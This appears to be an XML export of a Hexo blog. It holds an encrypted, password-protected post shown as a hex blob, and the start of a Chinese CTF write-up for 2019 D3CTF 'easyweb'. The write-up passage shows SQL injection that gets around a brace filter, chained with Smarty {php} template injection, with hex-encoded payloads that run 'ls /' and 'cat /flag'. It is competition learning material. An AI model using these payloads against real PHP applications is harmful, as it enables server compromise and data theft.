6b288a151e8bb42065c0d31281106292d1c140123b29ab155a7d7b1d19949f1160a3e8eced37306e341bff93956a5379e03b7bf0419c3c7cf9dd0b005bb84b422a400118c32181a1f00a89d427c20c92a236782d2dfe5fc0d6efb78dbfa4b9cdf7e4b2171ccc8ebbf25038a0d356a7dbdf366885dfbbd54f9a390310aeb45d552d14d12bf7931960d4c227c17ad175d7fdb6bf1f51797651a0669582157f5bd86b7f68a61f2898be824e47566a98a7bb8a9b5d20219cdf4ac9c6cd35cab3d7c660df864ecdfa8fc19ef2fe8e286a314f7ac07970422caaca5b687f910fe0d14c1d09cb7161822d2b533ede312f4712e7e5155021e2b77e5a30ca417ec381f6c9b81f80746d850f566d787bda63dfe8d96be8f19773328c2b2d86ffb41a7d195f60486d975c7cb71b9e5d94b1ff616dead1e64d0b26ed5c154ed5bc00f1b4eaffecd08ff782ef9920b395846d602fee1d66412123e00481fd22eb88dfef94ac8e353c42b05abb2ea3af2d21cecae5fbd6c3d734b1af86b2072aa83d278db3941460adc06eca45dbce3476faaf9ea25726f14486de4058b3e72742a6a33a95dffe31dce581bc336f0623585decc0512aa341177ee7e102f85a95dfabefe8853ed82849f75a62e4c8cabc8191a98d5122bb378f9842f51773a70bb41722012ef5c29413c53c66443d9bda7091c6e4475061cffcbb9cca5684834a684268293bf6847c578429be7706a68703e199c238bfc79642166b8ee8132282e182c7790ac0d423239264f5216d6c6b707591ddd1c33cc634bff9090509cc81056319f8288347a4bfcf77f14c0d8d6a259aacd0f53e7bd95fa07617b453dc44fd2aa51b31bbbdb2895757d098e89bc375deb9d7dccc2f932d7c9ed68e26cdc9395e123169839f02dd9a2d83015f1f4c09260bf670d2583258e0d4eed5cb3aa75bffba1bab1b90c6dbcf50be302697680e17fa34c5ad46f35ba7b33c03edd3fc21aa83b4026dcb0dbb9b9c4f1f137d396e2e247b14030d31a0396f06e9f115b60072a8f73ed0b37200e51fc56aca5dd160562a852aacf1066f46a6da03931d3ec3afd2d192338d8c0020e68a5cb17283859929c8ab34529c8ce9a39278265ebf6a296e7a4a5fdbdb2eeff48e5e6ca90df2addd459c7d4f5e31f2ed6e7363d4192a2864cf1022a9a4c38860528c07901a3d04210381fc5222325304c65b00b48c7a4d67c66b0149b6d86e3ec9ecfe03ed3972b77d39d2b80965ab8be4ed391974fd609bc8308563cee9ba80a70c40757d836729b685b9e0f926d37004df7c7564e2e1112ae6c66ac3ee1531d07dafd8279993541b6d10f69998d8065395bea327d1f0b1730161727b3c4889f2edceac4bfef4e6f9ec4c6d8d8495fc34b044d3072b9ee81eb5008e2e9d21ef3b89ffb334f84f33337e1580c11b4005f82d609bb057cacdce95a4f03371139c56a3693137ae53c77d3224b57bd94868fe4fec2864484cb5d8bfd2560886cffab7c3f815043324f1dfcebf1086f8345d5d0b62625060e25e75764cab1645845796453112f372be7f3757ad301930735159603f7b4ca6d0a78e121b3cb99324c39bd7fe699de48dde7533c043d59694f7621559a35c2336a577863aa3a03b812988719dcddb871e51c5ebcc24fd916fc72423f4f310dab3174d6e9a52f52c948fe6064f699284f82a890343f09805694d88dfcbb5a20610c65bcfe1db4eef31e777a326948d2cb9133488bde2bc58e1f87cfa8237d9111b46589bf9b414838d64ebc249b5d2e7c53baf3cdf1ae961c756beb2165568160196f7e4d65aa580a9d166e7e88707697b6865e6a85040dc209f667fc4cc3feaba3165c95c19c274db086698c202b2fcd1ecc370c98b8e501a79b15ca59e4502744109ee33ad55b267104df041bd78e00a8a0e21c68319ef1dfaf68cc6803defdbcc406444e439e3217d0144880a125399a3effc015749e871e352f9fe5d2b17a13f4ab176034f7a02bd67fe9ccf7a8ba85c547b2b2eba45c37f5c963c04abcff6d5049f43fb7be0a0ea027c624e0067303fb2e33f22e81e81a8dc17272eb8a4b0704de6711599c4377c38f1619ece4136ebcda4676dfe87908b7221fc0a5d29c4f543fcfa600781dd7f6f2988058a77698c0523d72dc0ad43a15de7875a15bec4bbb9bb08f7ca107cd5bbce0aef12caf22b883fc11cca2df7e2e8b788dbda4b1f9fc986b8096c7f44297c28613d7e44f6df4e5f0e46fc013ddb7b96dd8bffe2aa868b8841d2e6e8465cac1b836b91e9297ef4e98e261ee1ac0fa9d9383d200d7758fda45054b7bd1305b232d50802f9dce0a698564559eccb86c94f6e96201d0b9e5284141e36b678ef77b037adac2e946b5f30c801a20a1a1663d0ce884695af01e5a2de08b019f093aa2a6931d6a6fbe61f036f7da7ee89d1d63f785b41621b9646f646181f5d99a9d8e561c15144baf3a2bc0ca453f6ffa6a3a91dcbe54add0cb05c9e92807d672a85d6dd6dbb9b838c80a3c9f5330d02a0e59cf9cd2becf5ff8f1e4c8d3361e1401688ed0b95e5b45fe7d71083b8669108e86dbe58d4cc00e93c0d873f7626c74c8dc5ca3963044ce7b92fb586d828159573d8c622346d71a31d94962228d9e7a7cbc48a3410e7f9e58f10ca7911acfdcbfa76081c056df13e0116d1ad2ab127d60236fc72f2c81b7342c1eebea19d78c6739514183a8185604e225e6542ee630b536963f53d3418dd295a02c37cb5177ec7a869fe408c2fbdbe03f3eafb61ad59432690ca1766d79688a337579c5e727df5576a4879124fc22ee9c6868b76704edb4f1a810feb27432c7e93bbbba550bfa3054d4d2a95b48fece3bc70719ebfa25cffb9b935479753637053296ad9e0ac02aec8708cc0a72be62eca1f8a0a167cbd67feab9c2f20e1dab653c3851e60abca41e7bbcbbbbeba851c6526d6a57d717cd3048b16fb042adf9b6dda751d088bc6b21f8de88b8eebf571aa3cf68292827ac3fa864644b85624e15df03b6fdfa714fc82a8118138e268e2da3442d6e14f6453ded2ddbb8e926bd80416cf29d38a3fde3e4e1c0608258612e559ef79473f3cd2b5e6065db2e39c978bcdce4e6390d25e523d1bf57ac310563b0679a8696d0bf76dafef6e47e208cc459fe13e92e33cbc2bb14d976663720d28184c677c22ca49cf16d3a88f89980afbc39b3f35d7cb08a072f764c5d64122f61ef0d6c648cb1eebfc260f15def1d149847c25025232860322249acd8edd115c19b4bc8f96f247600e8541c4cd37942775a6ed5a687bb46881ea3bbc8a53fc79e52975d4e8db9731eb8cc227841e712b258c545cdf55ecf2dde6da4dbbac6151418b74b4513461e380dd67ba7fc3b134b8b1c90d2ec09d6d6477f53ecc1bde170dba4331113681d56582e948296a69684467e0bdd084c255d362e418313ebcf521d4562f961c54a8c927472841b1ce80bc15471bb828cf002fcf9bd597d3ea8d41c1d52b0355585d85c6871ada1aa3e7bbc045622becb020614e5dfd4dd69d3d68873fa68e0eccc6a38ba5305f237f6dc79cc4b76a44313eb0cab58df830f31982b73441003aea2d30302c97706eff3528fea179a7e09afd14d1b5eb991d986012dc739b53db0b61346ef80375c7d138656845acd8f9a4b349dcba6fb9a45c4b8d4fa5b4172f86afd083327f5a21b456008d7d0ca8cf8f2d27f02ba7c99abf3b6220bd3e14993de7975a03330d6a8202b4578661607eb9c52bb9755ed3c738465f67de36dfb1a54059d89abfdb4f1f7cbb78dc3b850b79db33752cea68f13c575275fccce0a4b0314f55c378d0eadb09d23c9003dff243f899924d677ac311ada24f9f96a560d98b5b3cc71502a6e179a1e087217cac8a8066fe56283fb1ab05032816bad8b5d46c4b1b8abd1d3ee35ad47d0ced22adb3365282c3b0ae191d3879ebd28b1bb61565de990e78019e6502a2261fbbe494d4aefab8720a12b40e1b7c4f3998d8977011df53fba4c70f3491d4d1ce8450ce8c65cd441aed88b5f38150d6fbfbf8fb220e06a4b83d7829f6eb8d88145b658c08127e1486fc68d4cea6e383d4b6626049fbc662804297661192966f44d99e0270b48d8ceb502aa5aa31f1381a12b1ce0d0b2f102d0821998332ce9ede2042d972f2cefcf96a0342ad572593874330872d819476e932824b2c50a5894777b8075c05029c6fab8e57525490f18302e48e9382f259ce4baf58f37b5abe9b57d6bc149276b5ebf38cbbfcdd2b3d63b047ee87be8f8a92c1d5b28eb60cefc281781ca2ca0fec6b2fe6de2929a54c25c96a513ab826f3dea89d7479ba0c051cbf912fa2474106c4e4d2b6260896e7f631c12c0e73eb4e20144948db87e34be10895da6a1008286e5927c07b8113f43011e4925d22494fe979b88638956850e9774d198b33bc3f2f12d9b88b6eb623041f6cc4e9cbc5eab796068e560cfabaf1284a17e73095a5af9a6bd067bc36a197042359310481875d673a8a088aee545a515f2f12d3f0068895edb5bc11f88cba2c9aee04aea2cc1780c0fa2d825620c56dd9ef61bb23bba226ab95e49fcbb51593b7d1cdef1a8ebcb58a1fe2342256907f37483db76295e31ca49781707bdd39b187d6690022904fb8d1c9ad697842d7cddeb604b689982634c13e452e7ed83b02a4b9a181c9ec15643ac4673e55ae0e9f935c053f8f64d420df2a8e01ef830fc6fe7ca75ab6e99801c4f0f15e02d33f146a92e851dba9b527c33b6dbb9e1d6e439290fe4180f461163a1eccd37c21aa2602e027c3f70c014b8bcd6df3877c11c84b486c3463982eba6fbc3af82998979a374391888987bfcd2880a6cc96b2683e7b2d7e17c1403b106f19a215466d6558a9e1c0b2f500883d9333c991d75e2b88817ca6744e9256b73d206c41846d28d42201f9141ee28b2247f6260fa9f99a6a234caf63484b28c028b2b9bffc1c7adecc6b16387e8566ca9694f78a0ca1d0979accce6d77e1dbd491fc999a8477e7ee1df7fd115bc0bc6e8ce6df452f233cb2ce0a4686299e25e32c70f12fda38399549a7bcfead54740b23e87bd1ec6df429f555e60caf03ef12c0354919f05eb9b1dab947d215be58ee83368e69482033329fe6262cb7eafa47de05518d483a323a4d8a217f771a6d7f834f6ba9fc8722a075e5b80c8bbc7f551348ba46d00ee607ab69695c8ae491f9db6a01c02898e6e45690445c6f1371e87a156b1010bcdb7e2c809392bb3d8f75c099196ee91b2eba6182497a51dc4a2da6f486bddf15524e443ffa9049cd6086e66bab73c225d25931d382d30b560f825dd5f32e4c8b7fb3b978052f2f06969a6402a9497cac42ce713651887f595d687b9e97e199086b26d9dfd3710736f0ee2cc0044d1be9d3c85bc73503ad2d6039b9d0261ec792565e0c76256c465ef9de52c0b65108c3b7874087910e4545cabc692b5e665be2417935d7ab22f0201a2925f2fe1e49a00b781a1a87b2818c5b6281e7088d0d2179774459f998873a573bd5c9540fcd10aebb27d869886375fdcf548c65f06d14893173e4a063ba703100fc84b101ab1b1a7e6886c7e719697f00b1ca59fc99e922d42e687a01d2f9628bfaaa516cb878f142d2e5255ac8234f7a41263f33131792f08366080ae84efc4a02c1ad7aac0ec0ccb63fcfa6a841eae981720db49ed27bb8c2260c8f654292125c1685a300abb35afda5e7cc3aaa4ea429beee2e2682dec4a4303193caa3395a1e3d8826d3913f7181c81a1b4f2876c9737b30c5732f78f693a04cfe8f0ec2ba09b2937abf53a69705de178aa82347ff52c49e0037f87582ce794fb7fbec3e6f2147f6dc37065b354d0980a090b6e9dafe0cd856e95d908c25ca1e964ba5a429ed5032c1c2a8d52b85e8984c36629547295a86c067a740803b54b7d918d881f4998c174b5aae5a117a5e600b94f75977075f96039a651bbe9c6065c8be791d7b30363cbcd446b2a6fa6f01557c3182cbb3dae09d9a79f0e613f46692f53e0f28fc5d76795922136dacb572fb3be0ee4d6e953650be8d153bbfa19d5ce1879588730bbde70efdc6276700f14ae07560d2ebcd5ab553ad988987a9dc912c8e81af4d08a1e8c5f03ffb0255570f05006795ad11b358eb355c450c16e1596e4dde3d928d3a487985b6d14e85bb52b592a5cf52a9fb4988b16a98321536be2cc07cc56fec257144e6ea73dac0e2c7746ff36d405bbb2cada7b90da68268e36859df28b6827e576093d4eb7a9d60103f417df4f3042589aa77e4e11c5f40a85e4467f5979e398cb7148f4db5099d9748de6373de5160f16685832cad2ef786dc77f75d20cd9785a5a0963597eb8b37d3eb5311e357715677a92dee64211239ae0fd6ea9b7c4202b762d5d702f28809e464a1a679131837542ef0227e3981b273cabc37995c5c46c8b982400772753ef3340946d118c3b9ad73bd5fb841f9503bb43ccdc3813e2dd09754b43a4ef5008803c06a1af115640126961aa01be14e6db002874f6e63db77457ce3ac2c1c660c979ed55e8ff8cd937166ff51a7d9803b0d202e106fe7ffc812b2aec808b27297357f93ff673e90f64023908e2a196644c65e20bd4ac135181ddb1a50a819da5fba1721d08c2b7760018a4db54e8f376f19b47d0e5ea60d68ef520252e14c34c0e7d37ea05119a54977ff8882557ff0ee1e753c23c662900bfe3b59acf04e7d176731cdaecd037d7cf1b906b2cf1f928b3363eefd77893144655864f45991a439aded6608e90f175bba8fa760efedc99790bfc8602e2500ddc4d00f0842eb547c5abc763ef192a7517a126c02db919bd5caa29e9dd6c61d8fbd371318b4f4d534ff9face802738ac6df14b18363b7c79e81b09575938ba903c671f00e1323a5e5ad2fc9b73207d24f92e1b66778b7c72a898e18828f71c52d086640d63b2a044c9f48a33722f23f0c1fccfde3e9d45ebdb315397f6d8a5952dedc552e1b456a2b58f3af50f456148d9a27f425509183f733c4553c7f0a6006a91b51410a1a14d5365de974d2f2d3b0948060c2ce37bd4b28372fb5a656ad5c31d8129df536c4586fc0f5f3dcef2baea685408322d9324e3ae25e53a18fc94c4a14213d936d97c87d3d7a48f3ffcdbea207b407f7c984679e093bc29813fdfca7f0e2cc9a8fa5c233d8411392ef83c7700831a453b9bca7eb9e86242d1809e20670a73891b80690adbe7e9f69c9a4f4717b0630b8bd3aea1a68e69a59543534b4c5515796a1e19b6af81c0fd880f6a7cf63586a03515b7f0635be128981ae2e242bc2f1324138742b38b8523c59275349ed479f55dca57b0c77576a02217b5977fc034e1a55ce045a591a36bcd117950bd9a50b0b9a8d0037c043f0a5cc8f80496214efe3c666790e6a001016b0bb22c56376392f4d6176320faa724081363b659c61e9b73a004f512cf93d2bbd518313cb6dfe78024bc737af07ea91432462584fa9d3569323927d82664632710ac4393d21b7cc45a5810ae1c13009fbbddac96892660a34a8b597bc73974b27cc83a229aff90ccef53623bbd0469570b874203a5e778098605b1deb1eb8beb5ff594645d8b4a27702d03343248267a65e5da8a4a4a1a1d4b3364a24ac8885ba39e727ccd3c762ae046d0d5a635a75cfebe3b6762747087cd2e86bd5a8e2ca9bcd4fc39fcf41993bcfaaa9312d4aca4dc8f5798ab0de80821f73db5fcdffab14a7c57d865f269b5131f91f7e38fd5c06a604acf1fd74bd4b7da1beb42b87a20723cbfe93970ee7f7b0f971a4dfb845525cb316185165959bee3c285da3a8b3676cc93b9692c6a97d01410221a7b1361f46c6ae89eb4e14a11ed40eab1b5902357ec82e675859037d8a5fc4ff2ebe2635e7ecd5cff5bd77436bdc4fe87b9a681f1025c9132160b5a4bb84f5d670b3327025650c1230ee2c9641df9ee8eb8cf92ea8ba0ba966b74b6ee6a748712b03d1581c82a494fb409b94bcc786257854ea2cfff7e165e6e4f49b9fb1e474846f31b6fe121c6c05a99046095759bd7ec319bdec9b03c3e59ad5c3f21eb553867709f69e88f1804501832b86d40ced03aa314d92ffe6c615020b1860ce18af8385a0db75cd4a1308ac8f603601b3aa9d6ca3d0eb9e6459486642a6517b89597ceae2e30919b5d2fe9711114e64672b4dc56152ce92adb2212beafbacf29df5078df481d87f5bf73c313e8efaf1d2c073d248685f6eff8106c5b3519881e1b7aa68861346287344427baaacc699ac2887bf1cb9e1243673d39db301783f4651a8e53c39f1530e8c1192af177b3e38f085eaadbf59a0127c3fa57e3b378353b8b8dfcc54519d3874bd8c4867f73ee2ca68d6a6d6b488f9c8af234db6f08c917c9c79e3ed2321d9986f8af19dcf1967d171e06bf4b27a2df0bf40f313807b748a5939882d331fe849c9a198940940b5821f7d175b99027f3a055512f8b778d4427e622a944a6092c0343b68c861c240a1593f229e4d9b5b418dab26e5c01d6c09d79191b94fd896d053ba320fcb718741b6ef464bda68477582b77f5df7ae9732b8c8dd2181a4752500d5bc9a528021583d3b00def124a9bce6421d974cd31e62a90b34ba6a232fbfda64381652b8f7116bc6ebe435debfab47809ef6acc8e9ae40a8f1424e9c85c1758a796d70b85f4f8ea4c23ad417775543ab67a951ba0d26a5abdd6a9b3b626fb02382978eaae4c157457bfc931a6955efa613882d0e4b48334e64d75a7be5ac3c699de9ef182a5b4c77c833c7aebae7b53a7b5f5a503c86a7f8311c431da1b6403065b56ea2ddfd2a85b49aa0086d9526ab62c12ab86febffa71983bea9af0b855fde0ded3522e7c2e09e9fd5416c468019379cb1d04fb7205de274a672f4d203a1299f10346b872bc27ab81385903a166e8d7dbed3aebcb896e299ebfb0f5ef82076262bc4fd9ab17df37d3bd806e6f11ec028ef471a651c9cff99c06e01dafa1498e7b8f48a15a8518d6f5e2b1bd6747c7b7286d57ce297a9d8801b1cb4e99988c8c65120e1949401c24aa55b145829053e2aff0e9fb1115f67985144e006c1cfa275d0a18f26a13fce82bb85a8b500239f2f080f876275719e59cbb49c74962381b2dbca4059bac467965354cba97207195cb9320200d2de8801c4ff601e08d361fb0543446e0deadbed12312fd65f5cba43ec53361d766d36e3d41121e51933d55a50fe58ac818203a0c106cb0bf7e82cfbf436ca8562b61890881bc361d21f40b5e7cce064cd27990acbb3887f0348fa028c6df5686c7c3658d7cc31424c49adf9270528b0cfa4d1dec1ebfb4c2f01b29c4382bdd9021c4c251852192687db9f094970bdfc0e5a38f02bb85d476b3b0780f00433e50e30c88db0546f4a06cb73eb283f7c30b31429a2875837f3d86ad6e0df44d2984cbb5df8dc38d7e1040a7f2fcbc5041b57caa07b459ce2862a45a34402a0c58230db26cce99e8d6807e32ec30f3395933c314a93fd15c08fc11081bc347ea50450fec67ff0cb6a870dbe3bd6156cfcf54f6b56d2ee648f2e002b36fff7e6e520192569d8c8cddeb90ee38e7d020c8bb96c9c6418ff2f94d720f3ff40224016618981c824d3972f7d31a96e5e29cdff90e2c5b531925f057ad272cdda614d0ce6646cbe71905513bbb24a8b3d93f14bf02ca40af2642746586a3e5201941f10402c6fb3a0b146f46631c479919b796030a6afcda0e9c4c94ddea93181bdde4faf34b38975169bbbae3f64269a3d2856663ff97747f1f76a4b70361c47827a9ddb903389f2d822e8999dd60bd4b8c903f3b316135e64989c0839d60c48e4a30aebfaf05e719efd06e145f0823655019acf072c0b6a468ee7f6504e84aa7d76adf485f31638e2505f766249c860b2f6601053d908270f24448a7e54bc9d42a2b71f836c2ef5784ddfa38f9f19b535c8c35a3eeb4d574cf2ba33160d33f77a0bc01d990f959b5f2e4bbf3b7b2f582c46513c1978f82b06e7971b0f654b4b49b83f691bd690e4a5ad88f288a2e67ff5c1ee4f9ff5deb4ec35f89ae6dd1877a86b7a74067bc3e92188bae3ca36c21124df6a61276133e2080c4d3509611b568e20ea7448709e435cb9e412ca45d0600394f4e232fef0e35c7f936b290f3e001842b306ec96bbc5502f42757e1c87745eb4e653483675c5ba8135b58de5ea020cf34edd607ad14d80b8bff6d54929ce6d0d11fa98e24ebe25f44aa32717fd2034ac9182dcb6e91ff1a244187b3526249a6213ac2ac692da9405fc88468c609e3ce7e044ba60dbc6fd7caca436851a28159a0223bfcfb39f2c988dc04abf8fc4bbc46ecc4d490437447d8cc93eb925d4859635aa80c44dc80235817f8a2fdd4c6d955e77cd32ae4021c1e035ac7a84840bb9e443f251e7be0253829efc38302ea7de52d4f69a25c03ce71e966a0b1e0f5bf4f2fa3c471b07da97b5c73057a93077433aa403c16d86b76245c477ead041d90e14970d9754a29ce71c0eea9e05f86fc80b82f82ebc2ab207e319c8700a5bfb09289b3d2754b567da14a41c0c064cfcf3471d2b78b653e29516278e8337331d00b9103c20143f7db84db8a169b0ce7251e1487ebafb09bc0a7d5724dcfe37600e858a74a8e3a9396271ed04d92c549837997cbec246f3a7d70ba36baaa36975cf557c12b9342803d5f247c854329f5d84c4e1b58cbfb6d8e751a347a984a91b4563f074458f9193582060f6cef05a0fe664d166a8ab9b464136e75d52678783e8cfb0dc16571684e63b59017d039ab6e3c22ed9f3cb53976428f44cb6cd01726b382d73b40b6369818065e4a1630195c866b0fbf2851869cd675b5ef56b395d378dafe859cc4be263e9646e528cf57472ae06e26a6f871bfaca7c35e65789766f64d7213a79f7c6684facce700af37c966a5c2b2620e0a4ab9492be000fd8d1cfcd653cb8ad8c454acd76def394d4fd65e1c22dc293fa5831251343ece70c60736010cf150fe44d079e47d7f43a000d0da43d44780d4d294ce7c0bd312b033938252aa12e062aced1d76340e07c417364352e151980de27f84831f7f64e5b1d5a7d5df8c9506f70c16fb5384bf0e675ea1048c3f6669c474bed22083b7224a2eb8968f34fdb8aed8b3ae398109cde73f96b527e66bea6266cd96dc9e651d61386bda7b439d4a0c3dd48fc1b3395697ace3937cf5827107a759863e051bd0c7bb50933fb97e758043df105daf7e47bbb3b6d5a53b49e2c4edc6a0fe571f9947b96c1e02498a6048c15fdf0f81d4459a8e8041f22aa12962531488ad31173d78dd7371bff778788be641fef3deb3717b86b7f3cca6312142cb0963b02141e4c8da547baddc1634a8b9a9a3d423963a538f8869d1106d09fa602d67acb139c5a6769f0d509c2ebfdc605dd9cb166b76f178ebc2000ab8eba3ff3094e84a58f1d2645f040d8d65bafcef5400ff14b981374eb4ec5da294c8ecf9ab01935557b4ae7224437e34eebae5e9f4813468bd3c6e70ed50e10b8953e475fcbd3e316a8d4d6c9ea031e15cfee92e27b6e28a80b75d332dad6d04f3d783cbf7a37b02b0ee05686ab80c2cf5376328a888d4d799e228493269c9aec7bb9276e378a9147a84c7714036dbd80b8509d71fe3664ecb8c3d63bbf049aebc542171e8ebad8e61d40c6af3d1578f6cd495f3c6db3720a7ff49522fd9068d156184e8dbbdfd57ea46710f6d3390a902d18bba5d1cc3a807a822088b1264778e2d01361d55e3afcd1c2bb6f3832519b0c7ee82952e86f2ed456610b06b983e31d6005b75356bbc29521f7152d964342660c4905d706ac5c9d4654318b5d309cdae753320f833465ae3b616fdf4861dfb14678713a99427f42afcae3731b40e8b3551c1ffa794b0772990375e962562f20cb44a7880ec08b1a6b29dc930fe82bc46024c8885b6963efac40afc6f8623a3d304a1bf4271b536534d98985f6806f1b19115c3cd105f8581ceed96ce4221e8c3ed56e1eb36b840d1806a597ce17a779abfc9ecc1a8bb30c59382dd6629bbd6b4c91e2133d43ec84715c137243ecd21bbcbf04caf1aa3002ca4945d99e4d61c4a90b091bf8fea3788452c1e8686a9e3f3275916c94956d676c7a24210f00f714c676fe07dc3931a012346ae5bbb552339e326b02eba28d90c20199eb6be3f9ba74cbfc03c41a65006b8b229918efbf362fd854d1335539b90d5c53077dbd52dff2e4f0326042c14de142abfbae1f4d95cb6b3dda08536777754c0b8c21525a55bccf03fc870b0b3e79a95b07a4e721f9d051b6fc6b3ada1c511d1f6e56c99630ec53049438d6fa430aec2a6153eab21f9cfeb3a33bbd1b66973d44bc4be17def6d73291a8b6b3a9a48a17a7e6dea0e22d69b22ec8a57a72686d692864240a6d65a7cea9304ab828fa53d94ba7796af22c1d0fb524b35edf72647d33e0e792720ce7fdc8bde299e4586903cade342e9105b2d64a4511962741ffc1a1ff136d708f327059a278bc0e75c64b41e992523375a8c35c6cf13a8c1a3e2bb26c7916b632f7f458f2f36b4f82477b882700c82790526d4f624e460588c9fa43837947f3c507fe7a4b5de554f8834de1a73ab2b93221a56b5124495cdd60cf04d57c19fdfd810e24cd7bd4e76af0cae0f843376db36714d79c2185a3e772eacdd1fbe61386de451bfa36e3b4c93ddcaeb32b837807d1bc5197afa32e2c4c68b22bd47c828e54d32fd856fe8a35f957da90233ef4f443605c479895a589bd24fe593a09a2854a35bdd2e22f17d007063dd5fcd9e168d5f5ae6120e90705c31b6f1e692c8430efde7089b6d210cb1843e5684497dc5d45b62faaa5a798cdc44b5aad48e2ff0a99636aaf02911300b68d82605fff2c8df400ad20573de02ba5a16e20627f9b149705435f8e908212eefbe5c6b00217aeb999de04fabf73bd7902583dc8b66707aacf0ed7b88b081179147ea6ecd0358e7fbb28c60dbe269fb09f52addbde1c9da60994414b3d877ab7d07abbda145460526933e6b3d5d75a4d2f607a09379cb93ea598e19b07712f82c7fb20067a22b07a4128810e7ac9d2b40f0ef579771e42007939e16af9ca856d63436f0b22f9d5caea856822522ed731fab32e5e1f8ecc36db7d0e09d5bfd9a58a795acfb977955b1b16994cf67e45609bf00bc30caa8ecdfc5332703c1debb8f2ec7a16885d377e333ed9cf191d60e60b096e320e49c85d1a753eaf90c9bfc3be936888cddc72caf1180960d9c1c213bc6cf927d1738013638c2c6b0e41cdbd1b27871c689e710fa7d35517a7e2c146aca04a6d607b8947049bbe87b111828baaefb94e390fa21f27d6d8c19910255e71ebfaa54fad329f2c420836f2d3fe14f7ff41232fdd3150becdafb6195eee60db3785598035b7b32476e1a70330954bd82a42d5932679d51f466a61ff6a0de68f777556dab6c456fbd0c03e28bb1605c8f70e9bc8d8b02ca6456e18229036dab7ef924ad86f77ec3d1c4073f1abe53f9574f7771925f40ebac94626087975d8a4b7e505f550b7a319543a5bd7d84a0e3b18ba7a506df3e69c20a3a729942ee6d76bc5a82d9242bf76d4d74cccfeabc7e284c33b0833be084faa8fee4e23d5d2555039f0f99a1a153ba999f33af413bc666988f478a57192f595c7427bc610154c29d45ebe03ff645154c31db5cee89cdd1f236d43a306c95bd6beac82d0371d36cd2534edb981f46e48f51c66003c086005547c5cf87e55d4f73e12f48ffc6c7f3eac3eaa9ccccb1271567f2d1d7994e36d76f98de9259d97e6ce3643bc672c8a0ee1ec1152ee9aba43a89fe7138000f1ac6a3bcb6cc10732e81be3ac9eee59f4a8879a2b396ecf423448da6bf0105902d5a688ffd7597bb62716a253badd9b916f3ea7bfe6a2d8ad54a1439fbf6bc1a968553162db762d7f36cdac27c1fc06ce492f7863e8a5d0e439620388737697f5a7736f70812ce398408d91fe348e91244b96e9ab3fcee5cac0542f5445824a7ad5acb0cc5ccfc6fc332432f01d9f0829c686efbb6e6a1ecbd271cc3e0f2fcb725b17fecc7fb5f0161609ffceabe21a47bc57858510579ecb1cebc3f7762abd52b0a40215010e2ad1cb64f455df43ba0e8b3358abb2fd3e5595455e91d64d09d89d31afbfb699fbd26e08877fb9e459c6126aff37f37a11c16a67ae91906922f789e77c5c444f36ff24f30fcf95b981034c9ab211c4469c38fc6ea92d583782278899f18b7e471ab52dcbb52b29c11c9975b4697cf86204051859031772d91d4edb3a4d091082fa584a3d336930495f99ba94cf9cd87b0cdcbf9d531504f26e8668af5c62e8fca718ac9d0210173e84873ac7e8d8f06c3f8e4b645f8818ce16f04562a6e1e86fb961c4c4912ce2cb889c0542a13f28c36bea9cd63badcfbfe0aaa2ee1ff9b498d1904c2acc05e480b39e91ec01a02e2dece8c38e99aec78834b5021603d9acd37259e47bc5bbc47b138b3a6bf17060d3e08a8c09f33c7e29ef8facf96e2ee655d427d01414e1363c9768c4d3bacaff555f271078621290c30d1f1b1b2ce1726650fc6271df0ebdd1a5ba9284ab6cd14e5b0690d6982a577c4ae2302d404f6accbfed901a0fc2abb85942cad864b38141c2e04b2f2fdfde63efa39bc00cea754d47ca170b3c71fcc67bf7f6add8d0a403583e133</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 D3CTF 部分题解</title>
    <url>/2019-D3CTF/</url>
    <content><![CDATA[<p>摸了。</p>
<span id="more"></span>
<h3 id="easyweb">easyweb</h3>
<p>源码审计。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">safe_render</span>(<span class="params"><span class="variable">$username</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="variable">$username</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>), <span class="string">&#x27;&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$username</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>safe_render()</strong>函数会替换<strong>{}</strong>为空，因此构造<strong>un{ion
sele}ct</strong>绕过。</p>
<p>发现追加<strong>select 0x736f757468
#</strong>有回显，再根据以上过滤的<strong>{}</strong>，猜测二次注入加上<strong>SSTI</strong>。</p>
<p>翻了一下<strong>Smarty</strong>的一些<a
href="https://www.freebuf.com/column/219913.html"><strong>Payload</strong></a>，测试发现可以使用<strong>{php}{/php}</strong>。</p>
<p>于是<strong>southsea' un{ion sele}ct
0x7b7b7068707d7d706870696e666f28293b7b7b2f7068707d7d
#</strong>，发现解析成功。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&#123;&#123;php&#125;&#125;system(&#x27;ls /&#x27;);&#123;&#123;/php&#125;&#125;&quot;.encode(&#x27;hex&#x27;)</span><br><span class="line"># southsea&#x27; un&#123;ion sele&#125;ct 0x7b7b7068707d7d73797374656d28276c73202f27293b7b7b2f7068707d7d #</span><br><span class="line"></span><br><span class="line">&quot;&#123;&#123;php&#125;&#125;system(&#x27;cat /flag&#x27;);&#123;&#123;/php&#125;&#125;&quot;.encode(&#x27;hex&#x27;)</span><br><span class="line"># southsea&#x27; un&#123;ion sele&#125;ct 0x7b7b7068707d7d73797374656d2827636174202f666c616727293b7b7b2f7068707d7d #</span><br><span class="line"></span><br><span class="line">&quot;&#123;&#123;php&#125;&#125;system(&#x27;/readflag /flag&#x27;);&#123;&#123;/php&#125;&#125;&quot;.encode(&#x27;hex&#x27;)</span><br><span class="line"># southsea&#x27; un&#123;ion sele&#125;ct 0x7b7b7068707d7d73797374656d28272f72656164666c6167202f666c616727293b7b7b2f7068707d7d 